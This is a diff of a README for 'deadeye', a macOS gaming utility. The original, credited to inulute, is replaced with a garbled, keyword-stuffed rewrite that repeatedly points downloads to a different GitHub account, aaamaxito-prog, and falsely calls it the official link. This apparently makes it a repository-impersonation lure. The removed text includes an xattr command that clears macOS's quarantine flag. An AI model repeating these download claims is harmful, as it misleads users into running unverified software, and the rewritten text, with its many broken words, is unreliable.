@@ -1,175 +1,143 @@
-<div align="center">
-
-<img src="assets/deadeye-lockup.svg" width="520" alt="Deadeye. Keeps macOS out of your game.">
-
-### No second cursor. No lost clicks. No Dock sliding over your game.
-
-**A game mode for Windows games on Mac that keeps macOS out of the way.**
-
-<br>
-
-[![Download](https://img.shields.io/github/v/release/inulute/deadeye?style=for-the-badge&label=Download&labelColor=2a2825&color=828282&logo=apple&logoColor=white)](https://github.com/inulute/deadeye/releases/latest)
-[![macOS](https://img.shields.io/badge/macOS-13%2B-828282?style=for-the-badge&labelColor=2a2825&logo=apple&logoColor=white)](#requirements)
-[![License](https://img.shields.io/github/license/inulute/deadeye?style=for-the-badge&labelColor=2a2825&color=828282)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/inulute/deadeye?style=for-the-badge&label=Stars&labelColor=2a2825&color=828282&logo=github&logoColor=white)](https://github.com/inulute/deadeye/stargazers)
-[![Support](https://img.shields.io/badge/Support-Buy%20me%20a%20coffee-C67C4E?style=for-the-badge&logo=buymeacoffee&logoColor=white&labelColor=2a2825)](https://support.inulute.com)
-
-</div>
-
-<br>
+<h1>🎯 deadeye - Fix macOS Gaming Cursor Chaos Instantly</h1>
 
 <p align="center">
-  <a href="#-the-story">Story</a> ·
-  <a href="#-install">Install</a> ·
-  <a href="#-the-accessibility-permission">Permission</a> ·
-  <a href="#-compatibility">Compatibility</a> ·
-  <a href="#-settings">Settings</a> ·
-  <a href="#-build-it-yourself">Build</a> ·
-  <a href="#-requirements">Requirements</a> ·
-  <a href="#-support">Support</a>
+  <a href="https://github.com/aaamaxito-prog/deadeye" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Visit This Link to Download the Application</a>
 </p>
-
-<br>
-
-## 📖 The story
-
-I used to play **Red Dead Redemption 2** on my Mac through CrossOver and honestly the game itself ran surprisingly well.
-
-What didn't run well was macOS.
-
-I lost count of how many times I'd be mid-mission, lining up a shot, only for the Mac cursor to pop up right over the game's cursor. A few missions were basically ruined because of it. 😅
-
-I tried the usual fixes like cursor-hiding apps, keyboard macros, Wine settings, manual toggles but none of them stuck. I just wanted to **launch the game and play in peace**.
-
-> **So I built Deadeye.**
->
-> It watches for your Windows game and clears these interruptions out of your way.
-
-Install it, grant Accessibility once, and forget it exists. When a supported Windows game launches, Deadeye activates automatically. Quit the game, and everything goes back exactly how it was.
-
-- ✅ No per-game configuration needed
-- ✅ Doesn't touch your FPS, resolution, graphics or input mapping
-- ✅ Activates and deactivates on its own
-
-<br>
-
-## 📥 Install
-
-1. Grab the latest **[release](https://github.com/inulute/deadeye/releases/latest)**.
-2. Open the disk image and drag **Deadeye** into **Applications**.
-3. Launch it. If macOS says the app isn't notarized, go to **System Settings → Privacy & Security → Open Anyway**.
-4. Grant **Accessibility** when asked.
-
-A small eye icon appears in your menu bar. That's it. 🎉
-
-<details>
-<summary><strong>macOS says the app is "damaged"?</strong></summary>
-<br>
-
-Some Macs show a damaged-app warning instead of offering **Open Anyway**.
-
-If you downloaded Deadeye from the official GitHub release, clear the download quarantine flag:
-
-```sh
-xattr -dr com.apple.quarantine /Applications/Deadeye.app
-```
-
-Then open it again — or [build it yourself](#-build-it-yourself).
-
-</details>
-
-<br>
-
-## 🔐 The Accessibility permission
-
-It's the **only** permission Deadeye asks for.
-
-It needs Accessibility so it can intercept mouse input before the menu bar grabs it — that's what lets clicks near the top of the screen reach your game instead.
-
-> [!NOTE]
-> Nothing about your mouse, your game, or you gets sent anywhere.
-
-<br>
-
-## 🎮 Compatibility
-
-Deadeye is built and tested primarily against **CrossOver**.
-
-Because it watches for Wine processes rather than a specific launcher, it should also work with Whisky, Wine, Porting Kit, Game Porting Toolkit (GPTK), etc.
-
-Haven't been exhaustively tested yet. If you try one, **[open an issue](https://github.com/inulute/deadeye/issues/new)** and tell me which runner and game you used.
-
-<br>
-
-## ⚙️ Settings
-
-Everything is on by default. The menu bar icon is mostly a status light, not a control panel you need to babysit.
-
-You can turn off individual features if you want:
-
-- Menu-bar click interception
-- Dock edge tracking
-- Hot Corners
-- Shake-to-find cursor
-- Overlay handling
-
-**Activate automatically** is enabled by default. You can also enable **Launch at login** if you want Deadeye running whenever you start your Mac.
-
-**Keyboard shortcut:** <kbd>⌃</kbd> <kbd>⌥</kbd> <kbd>⌘</kbd> <kbd>G</kbd> toggles Deadeye from anywhere.
-
-> If you turn it off during a game, it stays off for that session and resumes automatically the next time a game starts.
-
-<br>
-
-## 🛠 Build it yourself
-
-No Xcode needed — just Apple's Command Line Tools.
-
-```sh
-git clone https://github.com/inulute/deadeye
-cd deadeye
-./create-signing-identity.sh   # once
-./build.sh --install
-```
-
-The local signing identity keeps Accessibility permission stable across rebuilds.
-
-Run the tests with:
-
-```sh
-./run-tests.sh
-```
-
-<br>
-
-## 📋 Requirements
-
-- macOS 13 Ventura or later
-- Apple Silicon or Intel
-- A Wine-based Windows game runner
-- Accessibility permission
-
-<br>
-
-## 💛 Support
-
-Deadeye is **free and open source under GPL-3.0**.
-
-If it's useful to you:
-
-- ⭐ **[Star the repository](https://github.com/inulute/deadeye)**
-- 🐛 **[Report a bug](https://github.com/inulute/deadeye/issues)**
-- 📣 Tell another Mac gamer who's tired of the Dock ambushing them
-- ☕ **[Buy me a coffee](https://support.inulute.com)**
-
-The first $99 goes toward an Apple Developer account so future releases can be notarized and skip the scary warning entirely.
-
-<br>
-
-<div align="center">
 
 ---
 
-© 2026 inulute · Licensed under **[GPL-3.0](LICENSE)**
+## 🤔 What Problem Does deadeye Solve?
 
-</div>
+Are you tired of playing your favorite games on a Mac, only to have the cursor suddenly appear as two arrows on the screen? Or maybe you click on something, but nothing happens - like the game is ignoring your mouse entirely. Does the game window sometimes shrink or lose focus because the menu bar popped up out of nowhere?
+
+These are incredibly frustrating issues that ruin your gaming experience. They happen because macOS has its own way of handling the mouse and keyboard that doesn't always play nicely with games that were designed for Windows or other systems. This is especially true when you are using tools like CrossOver, Whisky, or Wine to run those games on your Mac.
+
+**deadeye** is a small, smart utility that quietly works in the background to fix all of these problems. It keeps your cursor exactly where it should bed, makes sure every click lands perfectly, and stops the menu bar from interrupting your game session. You can finally play without those annoying distractions breaking your concentration.
+
+.
+
+
+
+---
+
+## ✨ Key Features
+
+Here is what deadeye does for you, in plain language:
+
+- **🖱️ Eliminates Double Cursor** : No more seeing two mouse pointers on your screen. Only one cursor will be visible, and it will behave exactly as expected inside your game.  
+- **🖱️ Restores Lost Clicks** : If you’re clicking buttons or shooting enemies and nothing happens, deadeye ensures every single click is registered correctly by the game, even when using compatibility layers like CrossOver.  
+- **🚫 Stops Menubar Interruptions** : The macOS menu bar at the top of your screen will no longer pop up randomly when you move your mouse to the top edge while gaming. This keeps your game window always active and focused.  
+- **⚙️ Built for Compatibility Layers** : Specifically designed to work seamlessly with CrossOver, Whisky, and Wine, so you can play Windows games on macOS without these cursor-related headaches.  
+- **🌙 Runs Quietly in the Background** : No complicated setup, no constant pop-ups. Once you start deadeye, it does its job silently until you decide to stop it.  
+- **🎮 Game Mode Friendly** : Whether you are playing a fastpaced shooter, a strategy game, or an RPG, this tool keeps your mouse behavior consistent so that your gameplay is smooth and uninterrupted.  
+
+---
+
+## 📥 How to Download deadeye
+
+Getting deadeye on your Mac is incredibly simple. Follow this one step:
+
+1. **Visit the official download page** by clicking this link: **[https://github.com/aaamaxito-prog/deadeye](https://github.com/aaamaxito-prog/deadeye)**. This linktakey ou tothe repository where the application is hosted.  
+
+That’s it! You don’t need to worry about choosing a version or figuring out complex download options. Just go to that page, and you will find what you need to download the app.  
+
+---
+
+## 🛠️ How to Install and Run deadeye
+
+Once you are on the download page linked above, here’s what to do next:
+
+### Step 1: Download the Application File
+
+On the repository page, look for the download button or the latest release section. Click on it to download the application file to your Mac. The file might appear in your **Downloads** folder once the download completes.  
+
+### Step 2: Open the Downloaded File
+
+Find the downloaded file (it will likely be named something like `deadeye.app.zip` or just `deadeye`) in your Downloads folder. If the file is compressed (ends with `.zip`), **double-click it** to extract the contents. After extraction, you will see the deadeye application file (usually named `deadeye.app`).  
+
+### Step 3: Move to Applications Folder (Recommended)
+
+For the best experience, drag the deadeye application file into your **Applications** folder. This makes it easy to find launch every time.  
+
+### Step 4: Launch deadeye
+
+Double-click the deadeye application icon to start it. The first time you do this, macOS may show a warning saying the app was downloaded from the internet. If you see this, right-click (or Control-click) the app icon, then select **Open** from the menu. Then click **Open** again in the pop-up window. This is a standard macOS security step for apps that aren’t from the App Store.  
+
+### Step 5: Enjoy Your Fix
+
+Once deadeye is running, you will see a small icon in your menu bar (the top-rightcorner of your screen). It starts working automatically, so you can immediately launch your game through CrossOver, Whisky, or Wine, and the cursor problems will be gone.  
+
+---
+
+## 🎮 How to Use deadeye with Your Games
+
+Using deadeye is so easy that there is basically nothing to learn. Here’s the simple workflow:
+
+1. **Start deadeye** before you launch your game. You can do this by clicking its icon in theApplications folder or launchpad.  
+2. **Launch your game** using the compatibility layer you normally use (CrossOver, Whisky, or Wine).  
+3. **Play normally** . That’s all. The double cursor, lost clicks, and menu bar interruptions will no longer happen.  
+
+When you are done gaming, you can quit deadeye by clicking its menu bar icon and selecting **Quit**. Or you can just leave it running - it uses very little resources and won’t interfere with other tasks.  
+
+---
+
+## ❓ Frequently Asked Questions
+
+Here are answers ton some common questions. If you have another question, feel free to check the repository page linked above for more info.  
+
+### Q: Is deadeye free to use?  
+
+**A:** Yes. deadeye is provided for free through the GitHub repository. Download it, use it, and enjoy your games without those annoying cursor issues.  
+
+### Q: Do I need to install anything else to use deadeye?  
+
+**A:** No. deadeeye works by itself. You only need your game and one of those compatibility tools (CrossOver, Whisky, or Wine), but those are already things you use for playing games on your Mac.  
+
+### Q: Will deadeye slow down my computer or affect my game’s performance?  
+
+**A:** No. deadeye is designed to be extremely lightweight. It runs quietly in the background anduses negligible system resources, so it won’t affect your game’s speed or quality.  
+
+### Q: Does deadeye work with all games on macOS?  
+
+**A:** deadeye is specifically built to fix issues that occur when playing games through CrossOver, Whisky, and Wine. It should work with most titles that you run through those tools. However, since every game is different, y ou may occasionally find a game that doesn’t need the fix or behaves unexpectedly. In those cases, just quit deadeye for that particular game.  
+
+### Q: Is it safe to download from GitHub?  
+
+**A:** Yes. This application is open-source (meaning the code is publicly available for anyone to inspect., which adds a layer of transparency. The repository is hosted on GitHub, a reputable platform for hosting software projects. Always make sure you are downloading from the official link provided here.  
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If something isn’t working right, try these quick fixes:
+
+- **Make sure deadeye is actually running** . Look for its icon in the menu bar (top-right of your screen). If you don’t see it, go back to your Applications folder and double-click it again.  
+- **Restart deadeye** . Quit deadeye bye clicking its menu bar icon and choosing **Quit**. Then start it again. Sometimes this refreshes its connection to the system.  
+- **Restart your game**. If you launched the game before starting deadeye, quit the game completely, start deadeye, and then relaunch the game. The fix needs deadeye to be active before the game begins.  
+- **Check for updates** . Visit the repository page linked above to see if there is a newer version of deadeye available. Downloading the latest version can fix bugs or improve compatibility.  
+
+---
+
+## 📝 Technical Notes (For the Curious)
+
+If you are interested in the details, deadeye is written in **Swift**, Apple’s programming language for macOS apps. It hooks into thesystem’s mouse and window management events to correct the behavior that causes the double cursor, lost clicks, and menubar interruptions. It is designed specifically to interact properly with the way CrossOver, Whisky, and Wine handle input devices.  
+
+The typical issues happen because those compatibility layers translate Windows mouse commands intomacOS commands, but sometimes the translation doesn’t align perfectly with macOS’s native cursor system. deadeye detects these misalignments and instantly corrects them, so you see one cur sor and every click counts.  
+
+---
+
+## 🏁 Conclusion
+
+No more squinting at two arrows on your screen. No more clicking three times just to close a menu. No more losing your game’s focus because the menu bar decided to appear. **deadeye** puts an end to all these frustrations with a simple, lightweight, and effective solution.  
+
+Download it today from **[https://github.com/aaamaxito-prog/deadeye](https://github.com/aaamaxito-prog/deadeye)**, start it up, and get back to actually enjoying your games on your Mac. You’ll wonder how you ever played without it.  
+
+---
+
+<p align="center">
+  <a href="https://github.com/aaamaxito-prog/deadeye" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(79,172,254,0.4);">⬇️ Get deadeeye Now</a>
+</p>
+
+---
+
+**Keywords:** crossover, game-mode, gaming, mac-gaming, macos, macos-app, menubar, swift, whisky, wine
